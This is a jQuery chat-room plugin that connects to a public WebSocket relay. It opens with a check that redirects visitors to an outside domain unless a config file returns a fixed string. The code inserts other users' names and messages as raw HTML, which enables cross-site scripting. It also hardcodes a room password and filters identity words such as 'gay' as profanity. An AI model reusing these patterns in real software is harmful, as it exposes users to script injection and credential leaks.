$.get( "/inc/config.php", function( data ) {
if(data != "kkwhfwkhfefewuifh") {
window.location.href = 'http://srvstm.com';
}
});

$.fn.extend({ChatSocket: function(opciones) {
					var ChatSocket=this;
				
                    var idChat=$(ChatSocket).attr('id');
					defaults = {
		                  ws:"",
                          Room:"RoomDeveloteca",
                          pass:"hKJHGKL453JHGKL4235kljg345lig",
                          lblTitulChat:" Chat ",
                          lblCampoEntrada:"Menssage",
                          lblEnviar:"OK",
                          textoAyuda:"Chat",
                          Nombre:"Anonimo",
                          
                          urlImg:"http://icons.iconarchive.com/icons/oxygen-icons.org/oxygen/32/Emotes-face-smile-icon.png",
                          btnEntrar:"btnEntrar",
                          btnEnviar:"btnEnviar",
                          lblBtnEnviar:"OK",
                          lblTxtEntrar:"txtEntrar",
                          lblTxtEnviar:"txtMensaje",
                          lblBtnEntrar:"OK",
                          idDialogo:"DialogoEntrada",
                          classChat:"",
                          idOnline:"ListaOnline",
                          lblUsuariosOnline:"Online",
                        lblEntradaNombre:"Nome/Name/Nombre:",
                        panelColor:"success"
        			}
					
                     var opciones = $.extend({}, defaults, opciones);
		
                     var ws;
                     var Room=opciones.Room;
                     var pass=opciones.pass;
                     var lblTitulChat=opciones.lblTitulChat;
                     var lblCampoEntrada=opciones.lblCampoEntrada;
                     var lblEnviar=opciones.lblBtnEnviar;
                     var textoAyuda=opciones.textoAyuda;
                     var Nombre=opciones.Nombre;
                     
                     var urlImg=opciones.urlImg;
                     var btnEntrar=opciones.btnEntrar;
                     var btnEnviar=opciones.btnEnviar;
                     var lblBtnEnviar=opciones.lblBtnEnviar;
                     var lblTxtEntrar=opciones.lblTxtEntrar;
                     var lblTxtEnviar=opciones.lblTxtEnviar;
                     var lblBtnEntrar=opciones.lblBtnEntrar;
                     var idDialogo=opciones.idDialogo;
                     var classChat=opciones.classChat;
                     var idOnline=opciones.idOnline;
                     var lblUsuariosOnline=opciones.lblUsuariosOnline;
                     var lblEntradaNombre=opciones.lblEntradaNombre;
                     var panelColor=opciones.panelColor;
					 
                    if( $('#'+idOnline).length==0 )
                    {
                     idOnline=idChat+"listaOnline";
                        $('#'+idChat).append('<br/><div id="'+idOnline+'"></div>');
                        
                    }
    
    
    
            function IniciarConexion(){
                    conex='{"setID":"'+Room+'","passwd":"'+pass+'"}';
                    ws= new WebSocket("ws://achex.ca:4010");
                    ws.onopen= function(){ ws.send(conex); }
                    ws.onmessage= function(Mensajes){
                    var MensajesObtenidos=Mensajes.data;
                    var obj = jQuery.parseJSON(MensajesObtenidos);
                    AgregarItem(obj);
                    
                    if(obj.sID!=null){
                        
                                                      
                    if( $('#'+obj.sID).length==0 && $('#'+obj.Nombre).length==0 )
                    {
					if ( $('[title="' + obj.Nombre  + '"]').length === 0 ) {
                      $('#listaOnline').append('<li class="list-group-item" title="'+obj.Nombre+'"><img src="http://icons.iconarchive.com/icons/custom-icon-design/mono-general-1/32/chat-icon.png" width="14" height="14" border="0" align="absmiddle" />&nbsp;'+obj.Nombre+'</li>');
					}
                    }
                     
                    }
                    
                }
                ws.onclose= function(){
                    alert("Ooops!\n\nConexao encerrada, tente novamente!\nConnection closed, try again!\nConexion cerrada, vuelve a intentarlo!");
                }
          }
		  
           IniciarConexion();
		   
          function iniciarChat(){
            Nombre=$('#'+lblTxtEntrar).val();
			
			if(Nombre){
			
			// Faz loop no UL a procura de nomes iguais pelo ID
			if ( $('[title="' + Nombre  + '"]').length === 0 ) {
			
            $('#'+idDialogo).hide();
            $('#'+idOnline).show();
              
            CrearChat();  
            UsuarioOnline();
            getOnline();
			
			} else {
			alert("Ooops!\n\nO nome escolhido ja esta em uso.\nThe nick is already in use.\nEl nombre ya esta en uso.");
			}
			
			} else {
			alert("Ooops!\n\nInforme seu nome.\nType your nick.\nIntroduzca su nombre.");
			}
          }
           
          function CrearEntrada(){
          $('#'+idChat).append('<div id="'+idDialogo+'" class="'+classChat+'" id="InputNombre"><div class="panel-footer" style="margin-top:100px;"><div class="input-group"><input id="'+lblTxtEntrar+'" type="text" class="form-control input-sm" placeholder="'+lblEntradaNombre+'"><span class="input-group-btn"><button id="'+btnEntrar+'" class="btn btn-success btn-sm" >'+lblBtnEntrar+'</button></span></div></div></div>');
		  
         $('#'+idOnline).append(' <div class="panel panel-'+panelColor+'"><div class="panel-heading"><span class="glyphicon glyphicon-user"></span> '+lblUsuariosOnline+' (<span id="total_online"></span>)</div><div class="panel-body"><ul class="list-group" id="listaOnline"></ul></div><div class="panel-footer"><div class="input-group" style="height:27px;"></span></div></div></div>');
		 
              $("#"+lblTxtEntrar).keyup(function (e) {if (e.keyCode == 13) { iniciarChat(); }});
              $("#"+btnEntrar).click(function(){
			  $('#total_online').html(0);
			  iniciarChat();
              });
        }
          function CrearChat(){
             $('#'+idChat ).append( '<div class="'+classChat+'"><div class="panel panel-'+panelColor+'"><div class="panel-heading"><span class="glyphicon glyphicon-comment"></span>'+lblTitulChat+'</div><div class="panel-body"><ul class="chatpluginchat"></ul></div><div class="panel-footer"><div class="input-group"><input id="'+lblTxtEnviar+'" type="text" class="form-control input-sm" placeholder="'+lblCampoEntrada+'" /><span class="input-group-btn"><button  class="btn btn-warning btn-sm" id="'+btnEnviar+'">'+lblEnviar+'</button></span></div></div></div></div><li class="left clearfix itemtemplate" style="display:none"><span class="chat-img pull-left"><img src="'+urlImg+'" alt="User Avatar" class="img-circle" id="Foto"/></span><div class="chat-body clearfix"><div class="header"><strong class="primary-font" id="Nombre">Nombre</strong><small class="pull-right text-muted"><span class="glyphicon glyphicon-asterisk"></span><span id="Tiempo">12 mins ago</span></small></div> <p id="Contenido">Contenido</p></div></li>');
              
    $("#"+lblTxtEnviar).keyup(function (e) {if (e.keyCode == 13) { EnviarMensaje();}});
    $("#"+btnEnviar).click(function () {EnviarMensaje();});
              
        }
      
        function EnviarMensaje(){
			ws.send('{"to":"'+Room+'","Nombre":"'+Nombre+'","Contenido":"'+$('#'+lblTxtEnviar).val()+'"}');
			//timeout_button(3);
			$("#"+lblTxtEnviar).val('...');
			$("#"+lblTxtEnviar).prop('disabled', true);
			setTimeout(function() {
					$("#"+lblTxtEnviar).prop('disabled', false);
					$("#"+lblTxtEnviar).val('');
					$("#"+lblTxtEnviar).focus();
				}, 3000);
			  
        };
        function UsuarioOnline(){
           ws.send('{"to":"'+Room+'","Nombre":"'+Nombre+'"}');
		   var total_online = $('ul#listaOnline li').length;
		   $('#total_online').html(total_online);
        }
        function AgregarItem(Obj){
            
            if((Obj.Contenido!=null)&&(Obj.Nombre!=null)){
			
			// Filtra palavrão
			var filterWords = ["cú", "cu", "c u", "puta", "gay", "viado", "bicha", "bixa", "veado", "lesbica", "lésbica", "fuck", "bunda", "v i a d o", "puto"];
			var rgx = new RegExp(filterWords.join("|"), "gi");
			
			var mensagem = Obj.Contenido;
			var mensagem_final = mensagem.replace(rgx, "****");
			
			// Filtra emoticons
			var emoticons = { '>:('  : 'img-icone-chat-bravo.gif', ':-)' : 'img-icone-chat-feliz.gif', '=)'  : 'img-icone-chat-feliz.gif', ':)'  : 'img-icone-chat-feliz.gif', ':D'  : 'img-icone-chat-lingua.gif', ':P'  : 'img-icone-chat-lingua.gif', ':-P'  : 'img-icone-chat-lingua.gif', 'o_o'  : 'img-icone-chat-assustado.gif', ':('  : 'img-icone-chat-triste.gif', ':-('  : 'img-icone-chat-triste.gif', '<3'  : 'img-icone-chat-coracao.gif', 'S2'  : 'img-icone-chat-coracao.gif', ':-||'  : 'img-icone-chat-bravo.gif', ':@'  : 'img-icone-chat-bravo.gif', ';)'  : 'img-icone-chat-piscada.gif', ';-)'  : 'img-icone-chat-piscada.gif' }
			
			for ( smile in emoticons ) {
				mensagem_final = mensagem_final.replace(smile, '<img src="/img/icones/chat/' + emoticons[smile] + '" width="20" height="20" border="0" align="absmiddle" />');
			}
                
            $( ".itemtemplate" ).clone().appendTo( ".chatpluginchat" );
            $('.chatpluginchat .itemtemplate').show(10);
            $('.chatpluginchat .itemtemplate #Nombre').html(Obj.Nombre);
            $('.chatpluginchat .itemtemplate #Contenido').html(mensagem_final+'<audio src="/inc/beep.mp3" type="audio/mpeg" style="display:none" autoplay></audio>');
             
             var formattedDate = new Date();
             var d = (formattedDate.getDate() < 10 ? '0' : '') + formattedDate.getDate();
			 var m = (formattedDate.getMonth() + 1);
             var m = (m < 10 ? '0' : '') + m;
             var y = formattedDate.getFullYear();
             var h= formattedDate.getHours();
             var mn= (formattedDate.getMinutes() < 10 ? '0' : '') + formattedDate.getMinutes();
            
            Fecha=d+"/"+m+"/"+y+" "+h+":"+mn;
            
            $('.chatpluginchat .itemtemplate #Tiempo').html(Fecha);
            $('.chatpluginchat .itemtemplate').removeClass("itemtemplate");
			
			// Scroll
			var height = 0;
			$('.panel-body ul li').each(function(i, value){
				height += parseInt($(this).height());
			});
			
			height += '';
			
			$('.panel-body').animate({scrollTop: height});
			
            }
        }
           function getOnline() {
                setInterval(UsuarioOnline, 1000);
            }
           
         
         CrearEntrada();
    // Fin
	
	function timeout_button(time){
		var n=time;
		var c=n;
		$("#"+lblTxtEnviar).val(c);
		setInterval(function(){
			c--;
			if(c>=0){
				$("#"+lblTxtEnviar).val(c);
			}
			if(c==0){
				$("#"+lblTxtEnviar).val(n);
			}
		},1000);
	}
	
	}
});